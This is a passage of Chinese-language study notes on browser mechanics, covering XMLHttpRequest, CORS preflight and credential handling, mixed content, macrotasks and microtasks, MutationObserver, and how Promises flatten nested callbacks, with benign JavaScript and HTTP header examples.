== 200 || this.status == 304) { console.log(this.responseText); } console.log(\u0026#34;DONE\u0026#34;); break; } }; xhr.ontimeout = function (e) { console.log(\u0026#34;ontimeout\u0026#34;); }; xhr.onerror = function (e) { console.log(\u0026#34;onerror\u0026#34;); }; /** * 3: 打开请求 */ xhr.open(\u0026#34;Get\u0026#34;, URL, true); // 创建一个 Get 请求, 采用异步 /** * 4: 配置基础的请求信息 */ xhr.timeout = 3000; // 设置 xhr 请求的超时时间 xhr.responseType = \u0026#34;text\u0026#34;; // 设置响应返回的数据格式 xhr.setRequestHeader(\u0026#34;X_TEST\u0026#34;, \u0026#34;time.geekbang\u0026#34;); /** * 5: 发送请求 */ xhr.send(); } 上面是一段利用了 XMLHttpRequest 来请求数据的代码，再结合上面的流程图，可以分析下这段代码是怎么执行的。\n第一步：创建 XMLHttpRequest 对象。\n第二步：为 xhr 对象注册回调函数。\n第三步：配置基础的请求信息。\n第四步：发起请求。\n通过xhr.responseType = \u0026quot;text\u0026quot;来配置服务器返回的格式，将服务器返回的数据自动转换为自己想要的格式，如果将 responseType 的值设置为 json，那么系统会自动将服务器返回的数据转换为 JavaScript 对象格式。下面的图表是我列出的一些返回类型的描述：\n假如还需要添加自己专用的请求头属性，可以通过 xhr.setRequestHeader 来添加。\n调用xhr.send来发起网络请求，渲染进程会将请求发送给网络进程，然后网络进程负责资源的下载，等网络进程接收到数据之后，就会利用 IPC 来通知渲染进程；渲染进程接收到消息之后，会将 xhr 的回调函数封装成任务并添加到消息队列中，等主线程循环系统执行到该任务的时候，就会根据相关的状态来调用对应的回调函数。\n如果网络请求出错了，就会执行 xhr.onerror； 如果超时了，就会执行 xhr.ontimeout； 如果是正常的数据接收，就会执行 onreadystatechange 来反馈相应的状态。 参考下 Chromium 对 XMLHttpRequest 的实现，点击这里查看代码。\nXMLHttpRequest 使用过程中的问题 浏览器有很多安全策略的限制。\n1. 跨域问题\n在 A 站点中去访问不同源的 B 站点的内容，默认情况下，跨域请求是不被允许的，你可以看下面的示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 var xhr = new XMLHttpRequest(); var url = \u0026#34;https://time.geekbang.org/\u0026#34;; function handler() { switch (xhr.readyState) { case 0: // 请求未初始化 console.log(\u0026#34; 请求未初始化 \u0026#34;); break; case 1: //OPENED console.log(\u0026#34;OPENED\u0026#34;); break; case 2: //HEADERS_RECEIVED console.log(\u0026#34;HEADERS_RECEIVED\u0026#34;); break; case 3: //LOADING console.log(\u0026#34;LOADING\u0026#34;); break; case 4: //DONE if (this.status == 200 || this.status == 304) { console.log(this.responseText); } console.log(\u0026#34;DONE\u0026#34;); break; } } function callOtherDomain() { if (xhr) { xhr.open(\u0026#34;GET\u0026#34;, url, true); xhr.onreadystatechange = handler; xhr.send(); } } callOtherDomain(); 跨域报错：\n1 Access to XMLHttpRequest at \u0026#39;https://time.geekbang.org/\u0026#39; from origin \u0026#39;https://www.geekbang.org\u0026#39; has been blocked by CORS policy: No \u0026#39;Access-Control-Allow-Origin\u0026#39; header is present on the requested resource. 2. HTTPS 混合内容的问题\nHTTPS 混合内容是 HTTPS 页面中包含了不符合 HTTPS 安全要求的内容，比如包含了 HTTP 资源，通过 HTTP 加载的图像、视频、样式表、脚本等，都属于混合内容。\n通常，如果 HTTPS 请求页面中使用混合内容，浏览器会针对 HTTPS 混合内容显示警告，用来向用户表明此 HTTPS 页面包含不安全的资源。\n从上图可以看出，通过 HTML 文件加载的混合资源，虽然给出警告，但大部分类型还是能加载的。而使用 XMLHttpRequest 请求时，浏览器认为这种请求可能是攻击者发起的，会阻止此类危险的请求。比如通过浏览器打开地址 https://www.iteye.com/groups ，然后通过控制台，使用 XMLHttpRequest 来请求 http://img-ads.csdn.net/2018/201811150919211586.jpg ，这时候请求就会报错，出错信息如下图所示：\nsetTimeout 是直接将延迟任务添加到延迟队列中，而 XMLHttpRequest 发起请求，是由浏览器的其他进程或者线程去执行，然后再将执行结果利用 IPC 的方式通知渲染进程，之后渲染进程再将对应的消息添加到消息队列中。\n回调函数和系统调用栈\n问：建立 tcp 连接是在 xhr open 还是 send?\n答：open 方法仅仅是配置数据，没有任何真实的连接产生，所有连接阶段都是在 send 之后。\n问： fetch api 的实现是用了 xmlHttpRequest 么？如果不是，原理上有什么不同？\n答：fetch 采用了 promise 来封装，在使用方式上更强现代化，同时还原生支持 async/await。在 chromium 中，fetch 是完全重新实现的，和 xmlhttprequest 没有什么关系！在项目中推荐使用 fetch。\n问：跨域的请求是发送出去了，服务器也接收到了并响应了，而是在返回的时候被浏览器“拦截在门外”。\nCORS 全称是\u0026quot;跨域资源共享\u0026quot;（Cross-origin resource sharing），它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了 AJAX 只能同源使用的限制。\nCORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE 浏览器不能低于 IE10。\n整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。\n因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。\n两种请求 浏览器将 CORS 请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。\n只要同时满足以下两大条件，就属于简单请求：\n（1) 请求方法是以下三种方法之一：\nHEAD GET POST （2）HTTP 的头信息不超出以下几种字段：\nAccept Accept-Language Content-Language Last-Event-ID Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain 这是为了兼容表单（form），因为历史上表单一直可以发出跨域请求。AJAX 的跨域设计就是，只要表单可以发，AJAX 就可以直接发。\n凡是不同时满足上面两个条件，就属于非简单请求。\n浏览器对这两种请求的处理，是不一样的。\n简单请求 1.基本流程 对于简单请求，浏览器直接发出 CORS 请求。具体来说，就是在头信息之中，增加一个Origin字段。\n下面是一个例子，浏览器发现这次跨源 AJAX 请求是简单请求，就自动在头信息之中，添加一个Origin字段。\n1 2 3 4 5 6 GET /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... 上面的头信息中，Origin字段用来说明，本次请求来自哪个源(前端项目的地址)（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。\n如果Origin指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为 HTTP 回应的状态码有可能是 200。\n如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段：\n1 2 3 4 Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Credentials: true Access-Control-Expose-Headers: FooBar Content-Type: text/html; charset=utf-8 上面的头信息之中，有三个与 CORS 请求相关的字段，都以Access-Control-开头。\n（1）Access-Control-Allow-Origin\n该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。\n（2）Access-Control-Allow-Credentials\n该字段可选。它的值是一个布尔值，表示是否允许发送 Cookie。默认情况下，Cookie 不包括在 CORS 请求之中。设为true，即表示服务器明确许可，Cookie 可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送 Cookie，删除该字段即可。\n（3）Access-Control-Expose-Headers\n该字段可选。CORS 请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到 6 个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader('FooBar')可以返回FooBar字段的值。\n2.withCredentials 属性 上面说到，CORS 请求默认不发送 Cookie 和 HTTP 认证信息。如果要把 Cookie 发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。\n1 Access-Control-Allow-Credentials: true 另一方面，开发者必须在 AJAX 请求中打开withCredentials属性。\n1 2 var xhr = new XMLHttpRequest(); xhr.withCredentials = true; 否则，即使服务器同意发送 Cookie，浏览器也不会发送。或者，服务器要求设置 Cookie，浏览器也不会处理。\n但是，如果省略withCredentials设置，有的浏览器还是会一起发送 Cookie。这时，可以显式关闭withCredentials。\n1 xhr.withCredentials = false; 需要注意的是，如果要发送 Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie 依然遵循同源政策，只有用服务器域名设置的 Cookie 才会上传，其他域名的 Cookie 并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的 Cookie。\n非简单请求 预检请求 非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。\n非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为\u0026quot;预检\u0026quot;请求（preflight）。\n浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。\n下面是一段浏览器的 JavaScript 脚本。\n1 2 3 4 5 var url = \u0026#34;http://api.alice.com/cors\u0026#34;; var xhr = new XMLHttpRequest(); xhr.open(\u0026#34;PUT\u0026#34;, url, true); xhr.setRequestHeader(\u0026#34;X-Custom-Header\u0026#34;, \u0026#34;value\u0026#34;); xhr.send(); 上面代码中，HTTP 请求的方法是PUT，并且发送一个自定义头信息X-Custom-Header。\n浏览器发现，这是一个非简单请求，就自动发出一个\u0026quot;预检\u0026quot;请求，要求服务器确认可以这样请求。下面是这个\u0026quot;预检\u0026quot;请求的 HTTP 头信息。\n1 2 3 4 5 6 7 8 OPTIONS /cors HTTP/1.1 Origin: http://api.bob.com Access-Control-Request-Method: PUT Access-Control-Request-Headers: X-Custom-Header Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... \u0026ldquo;预检\u0026quot;请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。\n除了Origin字段，\u0026ldquo;预检\u0026quot;请求的头信息包括两个特殊字段。\n（1）Access-Control-Request-Method\n该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是PUT。\n（2）Access-Control-Request-Headers\n该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是X-Custom-Header。\n预检请求的回应 服务器收到\u0026quot;预检\u0026quot;请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。\n1 2 3 4 5 6 7 8 9 10 11 12 HTTP/1.1 200 OK Date: Mon, 01 Dec 2008 01:15:39 GMT Server: Apache/2.0.61 (Unix) Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Content-Type: text/html; charset=utf-8 Content-Encoding: gzip Content-Length: 0 Keep-Alive: timeout=2, max=100 Connection: Keep-Alive Content-Type: text/plain 上面的 HTTP 回应中，关键的是Access-Control-Allow-Origin字段，表示http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。\n1 Access-Control-Allow-Origin: * 如果服务器否定了\u0026quot;预检\u0026quot;请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。\n1 2 XMLHttpRequest cannot load http://api.alice.com. Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin. 服务器回应的其他 CORS 相关字段如下。\n1 2 3 4 Access-Control-Allow-Methods: GET, POST, PUT Access-Control-Allow-Headers: X-Custom-Header Access-Control-Allow-Credentials: true Access-Control-Max-Age: 1728000 （1）Access-Control-Allow-Methods\n该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次\u0026quot;预检\u0026quot;请求。\n（2）Access-Control-Allow-Headers\n如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在\u0026quot;预检\u0026quot;中请求的字段。\n（3）Access-Control-Allow-Credentials\n该字段与简单请求时的含义相同。\n（4）Access-Control-Max-Age\n该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是 20 天（1728000 秒），即允许缓存该条回应 1728000 秒（即 20 天），在此期间，不用发出另一条预检请求。\n浏览器的正常请求和回应 一旦服务器通过了\u0026quot;预检\u0026quot;请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。\n下面是\u0026quot;预检\u0026quot;请求之后，浏览器的正常 CORS 请求。\n1 2 3 4 5 6 7 PUT /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com X-Custom-Header: value Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... 上面头信息的Origin字段是浏览器自动添加的。\n下面是服务器正常的回应。\n1 2 Access-Control-Allow-Origin: http://api.bob.com Content-Type: text/html; charset=utf-8 上面头信息中，Access-Control-Allow-Origin字段是每次回应都必定包含的。\n与 JSONP 的比较 CORS 与 JSONP 的使用目的相同，但是比 JSONP 更强大。\nJSONP 只支持GET请求，CORS 支持所有类型的 HTTP 请求。JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。\n宏任务和微任务 消息队列存放的是粗时间颗粒度的任务，对于实时性要求高的任务，又出现了一种新的技术——微任务。微任务可以在实时性和效率之间做一个有效的权衡。\n基于微任务的技术有 MutationObserver、Promise 以及以 Promise 为基础开发出来的很多其他的技术。\n宏任务 页面中的大部分任务都是在主线程上执行的，这些任务包括了：\n渲染事件（如解析 DOM、样式计算，计算布局、绘制）； 用户交互事件（如鼠标点击、滚动页面、放大缩小，定时器，http 请求，，MessageChannel 等）； JavaScript 脚本执行事件； 网络请求完成、文件读写完成事件。 特别的异步方法：requestFrameAnimation 和 requestIdleCallback，这两个任务是跟渲染相关的，不算事件环的内容。这两个方法会在 UI 渲染的过程中被固定触发。\n为了协调这些任务有序地在主线程上执行，渲染进程引入了消息队列和事件循环机制，渲染进程内部会维护多个消息队列，比如延迟执行队列和普通的消息队列。然后主线程采用一个 for 循环，不断地从这些任务队列中取出任务并执行任务。把这些消息队列中的任务称为宏任务。\n在WHATWG 规范中是怎么定义事件循环机制的。\n总结 WHATWG 规范定义的大致流程：\n先从多个消息队列中选出一个最老的任务，这个任务称为 oldestTask； 然后循环系统记录任务开始执行的时间，并把这个 oldestTask 设置为当前正在执行的任务； 当任务执行完成之后，删除当前正在执行的任务，并从对应的消息队列中删除掉这个 oldestTask； 最后统计执行完成的时长等信息。 宏任务可以满足大部分的日常需求，不过如果有对时间精度要求较高的需求，宏任务就难以胜任了，为什么宏任务难以满足对时间精度要求较高的任务。\n前面说过页面的渲染事件、各种 IO 的完成事件、执行 JavaScript 脚本的事件、用户交互的事件等都随时有可能被添加到消息队列中，而且添加事件是由系统操作的，JavaScript 代码不能准确掌控任务要添加到队列中的位置，控制不了任务在消息队列中的位置，所以很难控制开始执行任务的时间。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;demo\u0026#34;\u0026gt; \u0026lt;ol\u0026gt; \u0026lt;li\u0026gt;test\u0026lt;/li\u0026gt; \u0026lt;/ol\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function timerCallback2() { console.log(2); } function timerCallback() { console.log(1); setTimeout(timerCallback2, 0); } setTimeout(timerCallback, 0); \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; 在这段代码中，目的是想通过 setTimeout 来设置两个回调任务，并让它们按照前后顺序来执行，中间也不要再插入其他的任务，因为如果这两个任务的中间插入了其他的任务，就很有可能会影响到第二个定时器的执行时间了。\n但实际情况是我们不能控制的，比如在调用 setTimeout 来设置回调任务的间隙，消息队列中就有可能被插入很多系统级的任务。可以打开 Performance 工具，来记录下这段任务的执行过程，也可参考文中记录的图片：\nsetTimeout 函数触发的回调函数都是宏任务，如图中，左右两个黄色块就是 setTimeout 触发的两个定时器任务。\n现在重点观察上图中间浅红色区域，这里有很多一段一段的任务，这些是被渲染引擎插在两个定时器任务中间的任务。如果中间被插入的任务执行时间过久的话，那么就会影响到后面任务的执行了。\n所以说宏任务的时间粒度比较大，执行的时间间隔是不能精确控制的，对一些高实时性的需求就不太符合了，比如后面要介绍的监听 DOM 变化的需求。\n微任务 异步回调主要有两种方式:\n第一种是把异步回调函数封装成一个宏任务，添加到消息队列尾部，当循环系统执行到该任务的时候执行回调函数。这种比较好理解， setTimeout 和 XMLHttpRequest 的回调函数都是通过这种方式来实现的。\n第二种方式的执行时机是在主函数执行结束之后、当前宏任务结束之前执行回调函数，这通常都是以微任务形式体现的。\n微任务就是一个需要异步执行的函数，执行时机是在主函数执行结束之后、当前宏任务结束之前。\n微任务系统是怎么运转? V8 引擎的层面分析\n当一段 JS 脚本执行时，V8 会为其创建一个全局执行上下文，在创建全局执行上下文的同时，V8 引擎也会在内部创建一个微任务队列。这个微任务队列就是用来存放微任务的，因为在当前宏任务执行的过程中，有时候会产生多个微任务，这时候就需要使用这个微任务队列来保存这些微任务了。不过这个微任务队列是给 V8 引擎内部使用的，所以是无法通过 JavaScript 直接访问的。\n也就是说每个宏任务都关联了一个微任务队列。\n微任务产生的时机和执行微任务队列的时机 微任务是怎么产生的？\n第一种方式是使用 MutationObserver 监控某个 DOM 节点，然后再通过 JavaScript 来修改这个节点，或者为这个节点添加、删除部分子节点，当 DOM 节点发生变化时，就会产生 DOM 变化记录的微任务。\n第二种方式是使用 Promise，当调用 Promise.resolve() 或者 Promise.reject() 的时候，也会产生微任务。\n通过 DOM 节点变化产生的微任务或者使用 Promise 产生的微任务都会被 JavaScript 引擎按照顺序保存到微任务队列中。\n微任务队列是何时被执行的？\n通常情况下，在当前宏任务中的 JavaScript 快执行完成时，也就在 JavaScript 引擎准备退出全局执行上下文并清空调用栈的时候，JavaScript 引擎会检查全局执行上下文中的微任务队列，然后按照顺序执行队列中的微任务。WHATWG 把执行微任务的时间点称为检查点。当然除了在退出全局执行上下文式这个检查点之外。\n如果在执行微任务的过程中，产生了新的微任务，同样会将该微任务添加到微任务队列中，V8 引擎一直循环执行微任务队列中的任务，直到队列为空才算执行结束。也就是说在执行微任务过程中产生的新的微任务并不会推迟到下个宏任务中执行，而是在当前的宏任务中继续执行。\n该示意图是在执行一个 ParseHTML 的宏任务，在执行过程中，遇到了 JavaScript 脚本，那么就暂停解析流程，进入到 JavaScript 的执行环境。从图中可以看到，全局上下文中包含了微任务列表。\n在 JavaScript 脚本的后续执行过程中，分别通过 Promise 和 removeChild 创建了两个微任务，并被添加到微任务列表中。接着 JavaScript 执行结束，准备退出全局执行上下文，这时候就到了检查点了，JavaScript 引擎会检查微任务列表，发现微任务列表中有微任务，那么接下来，依次执行这两个微任务。等微任务队列清空之后，就退出全局执行上下文。\n以上就是微任务的工作流程，从上面分析可以得出如下几个结论：\n微任务和宏任务是绑定的，每个宏任务在执行时，会创建自己的微任务队列。 微任务的执行时长会影响到当前宏任务的时长。比如一个宏任务在执行过程中，产生了 100 个微任务，执行每个微任务的时间是 10 毫秒，那么执行这 100 个微任务的时间就是 1000 毫秒，也可以说这 100 个微任务让宏任务的执行时间延长了 1000 毫秒。写代码的时候一定要注意控制微任务的执行时长。 在一个宏任务中，如果分别创建另一个用于回调的宏任务和微任务，无论什么情况下，微任务都早于宏任务执行。 监听 DOM 变化方法演变 早期页面并没有提供对 DOM 监听的支持，那时要观察 DOM 是否变化，唯一能做的就是轮询检测，比如使用 setTimeout 或者 setInterval 来定时检测 DOM 是否有改变。这种方式简单粗暴，但是会遇到两个问题：如果时间间隔设置过长，DOM 变化响应不够及时；反过来如果时间间隔设置过短，又会浪费很多无用的工作量去检查 DOM，会让页面变得低效。\n直到 2000 年的时候引入了 Mutation Event，Mutation Event 采用了观察者的设计模式，当 DOM 有变动时就会立刻触发相应的事件，这种方式属于同步回调。\n采用 Mutation Event 解决了实时性的问题，因为 DOM 一旦发生变化，就会立即调用 JavaScript 接口。但也正是这种实时性造成了严重的性能问题，因为每次 DOM 变动，渲染引擎都会去调用 JavaScript，这样会产生较大的性能开销。比如利用 JavaScript 动态创建或动态修改 50 个节点内容，就会触发 50 次回调，而且每个回调函数都需要一定的执行时间，这里假设每次回调的执行时间是 4 毫秒，那么 50 次回调的执行时间就是 200 毫秒，若此时浏览器正在执行一个动画效果，由于 Mutation Event 触发回调事件，就会导致动画的卡顿。\n也正是因为使用 Mutation Event 会导致页面性能问题，所以 Mutation Event 被反对使用，并逐步从 Web 标准事件中删除了。\n为了解决了 Mutation Event 由于同步调用 JavaScript 而造成的性能问题，从 DOM4 开始，推荐使用 MutationObserver 来代替 Mutation Event。MutationObserver API 可以用来监视 DOM 的变化，包括属性的变化、节点的增减、内容的变化等。\n首先，MutationObserver 将响应函数改成异步调用，可以不用在每次 DOM 变化都触发异步调用，而是等多次 DOM 变化后，一次触发异步调用，并且还会使用一个数据结构来记录这期间所有的 DOM 变化。这样即使频繁地操纵 DOM，也不会对性能造成太大的影响。\n通过异步调用和减少触发次数来缓解了性能问题，那么如何保持消息通知的及时性呢？如果采用 setTimeout 创建宏任务来触发回调的话，那么实时性就会大打折扣，因为上面分析过，在两个任务之间，可能会被渲染进程插入其他的事件，从而影响到响应的实时性。\n在每次 DOM 节点发生变化的时候，渲染引擎将变化记录封装成微任务，并将微任务添加进当前的微任务队列中。这样当执行到检查点的时候，V8 引擎就会按照顺序执行微任务了。\n综上所述， MutationObserver 采用了“异步 + 微任务”的策略。\n通过异步操作解决了同步操作的性能问题； 通过微任务解决了实时性的问题。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 function executor(resolve, reject) { let rand = Math.random(); console.log(1); console.log(rand); if (rand \u0026gt; 0.5) resolve(); else reject(); } var p0 = new Promise(executor); var p1 = p0.then((value) =\u0026gt; { console.log(\u0026#34;succeed-1\u0026#34;); return new Promise(executor); }); var p3 = p1.then((value) =\u0026gt; { console.log(\u0026#34;succeed-2\u0026#34;); return new Promise(executor); }); var p4 = p3.then((value) =\u0026gt; { console.log(\u0026#34;succeed-3\u0026#34;); return new Promise(executor); }); p4.catch((error) =\u0026gt; { console.log(\u0026#34;error\u0026#34;); }); console.log(2); 问题：微任务队列只存在全局执行上下文中吗？ 如果一个微任务是在一个函数执行上下文中产生了，也会保存到全局执行上下文中的微队列中吗？\n问：之前讲过，在循环系统的一个循环中，先从消息队列头部取出一个任务执行，该任务执行完后，再去延迟队列中找到所有的过期任务依次执行完。那前面这句话和本篇文章的这句话好像有矛盾：\u0026ldquo;先从多个消息队列中选出一个最老的任务，这个任务称为 oldestTask\u0026rdquo;\n答：第一段话是 WHATWG 标准定义的，在 WHATWG 规范，定义了在主线程的循环系统中，可以有多个消息队列，比如鼠标事件的队列，IO 完成消息队列，渲染任务队列，并且可以给这些消息队列排优先级。 但是在浏览器实现的过程中，目前只有一个消息队列，和一个延迟执行队列。 一个是规范，一个是实现，主要我没有在文中强调这点，所以你会产生的这样的疑问。\n问：通常情况下，在当前宏任务中的 JavaScript 快执行完成时，也就在 JavaScript 引擎准备退出全局执行上下文并清空调用栈的时候，JavaScript 引擎会检查全局执行上下文中的微任务队列，然后按照顺序执行队列中的微任务。在页面生存周期内，全局执行上下文只有一份并且会一直存在调用栈中，只有当页面被关闭的时候全局执行上下文才会消失。页面都快关闭了，把全局执行上下文中的微任务队列中的任务都执行一遍，好像也没啥意义。系统应该不会做没有意义的事情，所以应该是我对全局执行上下文的某处理解有问题，但我又自查不到。\n答：涉及到来了 V8 是怎么执行的了，专栏中的\u0026quot;全局执行上下文\u0026quot;我没有深入分析。所以我偷懒了，把两个稍微有点不同的概念都称为了“全局执行上下文”，要解释清楚这个问题还要牵涉到 V8 的一个底层逻辑，既然你提出来了，那我就打算在课程结束后，通过加餐的形式来开一讲，讲清楚了这个还能额外地理解 Realm 概念。\nPromise 学习一门新技术先了解这门技术的历史，它所解决的问题，抓住这门技术的本质。\nPromise 到底解决了什么问题呢？（面试）\nPromise 解决的是异步编码风格的问题，而不是一些其他的问题。\n怎么让项目的代码书写得更具有连贯性。\n异步编程的问题：代码逻辑不连续，分散 JavaScript 的异步编程模型\n在执行一项耗时的任务时，比如下载网络文件任务、获取摄像头等设备信息任务，这些任务都会放到页面主线程之外的进程或者线程中去执行，这样就避免了耗时任务“霸占”页面主线程的情况。\n页面主线程发起一个耗时的任务，并将任务交给另外一个进程（或者同一个进程中的其他线程）去处理，这时页面主线程会继续本轮同步代码余下的部分，然后继续事件循环取出执行消息队列中的任务。等其他进程处理完任务后，会将任务添加到渲染进程的消息队列中，并排队等待循环系统的处理。排队结束之后，循环系统会取出消息队列中的任务进行处理执行。\nWeb 页面的单线程架构决定了异步回调，而异步回调影响到了我们的编码方式。\n假设有一个下载的需求，使用 XMLHttpRequest 来实现，参考下面这段代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // 执行状态 function onResolve(response) { console.log(response); } function onReject(error) { console.log(error); } let xhr = new XMLHttpRequest(); xhr.ontimeout = function (e) { onReject(e); }; xhr.onerror = function (e) { onReject(e); }; xhr.onreadystatechange = function () { onResolve(xhr.response); }; // 设置请求类型，请求 URL，是否同步信息 let URL = \u0026#34;https://time.geekbang.com\u0026#34;; xhr.open(\u0026#34;Get\u0026#34;, URL, true); // 设置参数 xhr.timeout = 3000; // 设置 xhr 请求的超时时间 xhr.responseType = \u0026#34;text\u0026#34;; // 设置响应返回的数据格式 xhr.setRequestHeader(\u0026#34;X_TEST\u0026#34;, \u0026#34;time.geekbang\u0026#34;); // 发出请求 xhr.send(); 执行上面这段代码，可以正常输出结果的。但是，这一段代码里面竟然出现了五次回调，这么些回调分散在不同位置，会导致代码的逻辑不连贯、不线性，不符合人的直觉，这就是异步回调带来的编码方式。\n封装这堆凌乱的代码，降低处理异步回调的次数。\n封装异步代码，让处理流程变得线性\n由于重点关注的是输入内容（请求信息）和输出内容（回复信息），至于中间的异步请求过程，不想在代码里面体现太多，因为这会干扰核心的代码逻辑。\n回调地狱\n第一是嵌套调用，下一个的任务依赖上一个任务的请求结果，并在上一个任务的回调函数内部执行新的业务逻辑，这样当嵌套层次多了之后，代码的可读性就变得非常差了。 第二是任务的不确定性，执行每个任务都有两种可能的结果（成功或者失败），所以体现在代码中就需要对每个任务的执行结果做两次判断，这种对每个任务都要进行一次额外的错误处理的方式，明显增加了代码的混乱程度。 原因分析出来后，问题的解决思路：\n第一是消灭嵌套调用；\n第二是合并多个任务的错误处理。\nPromise：消灭嵌套调用和多次错误处理\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 function XFetch(request) { function executor(resolve, reject) { let xhr = new XMLHttpRequest(); xhr.open(\u0026#34;GET\u0026#34;, request.url, true); xhr.ontimeout = function (e) { reject(e); }; xhr.onerror = function (e) { reject(e); }; xhr.onreadystatechange = function () { if (this.readyState === 4) { if (this.status === 200) { resolve(this.responseText, this); } else { let error = { code: this.status, response: this.response, }; reject(error, this); } } }; xhr.send(); } return new Promise(executor); } 利用 XFetch 来构造请求流程，代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 var x1 = XFetch(makeRequest(\u0026#34;https://time.geekbang.org/?category\u0026#34;)); var x2 = x1.then((value) =\u0026gt; { console.log(value); return XFetch(makeRequest(\u0026#34;https://www.geekbang.org/column\u0026#34;)); }); var x3 = x2.then((value) =\u0026gt; { console.log(value); return XFetch(makeRequest(\u0026#34;https://time.geekbang.org\u0026#34;)); }); x3.catch((error) =\u0026gt; { console.log(error); }); Promise 是怎么消灭嵌套回调的。产生嵌套函数的一个主要原因是在发起任务请求时会带上回调函数，这样当任务处理结束之后，下个任务就只能在回调函数中来处理了。\nPromise 主要通过下面两步解决嵌套回调问题的。\n首先，Promise 实现了回调函数的延时绑定。回调函数的绑定在代码上的体现就是先创建 Promise 对象 x1，通过 Promise 的构造函数 executor 来执行业务逻辑；创建好 Promise 对象 x1 之后，再使用 x1.then 来设置回调函数。示范代码如下：\n1 2 3 4 5 6 7 8 9 10 11 //创建Promise对象x1，并在executor函数中执行业务逻辑 function executor(resolve, reject) { resolve(100); } let x1 = new Promise(executor); //x1延迟绑定回调函数onResolve function onResolve(value) { console.log(value); } x1.then(onResolve); 其次，需要将回调函数 onResolve 的返回值穿透到最外层。因为会根据 onResolve 函数的传入值来决定创建什么类型的 Promise 任务，创建好的 Promise 对象需要返回到最外层，这样就可以摆脱嵌套循环了。你可以先看下面的代码：\nPromise 通过回调函数延迟绑定和回调函数返回值穿透的技术，解决了循环嵌套。\nPromise 处理异常 Promise 对象的错误具有“冒泡”性质，会一直向后传递，直到被 onReject 函数处理或 catch 语句捕获为止。具备了这样“冒泡”的特性后，就不需要在每个 Promise 对象中单独捕获异常了。\nPromise 与微任务 1 2 3 4 5 6 7 8 9 function executor(resolve, reject) { resolve(100); } let demo = new Promise(executor); function onResolve(value) { console.log(value); } 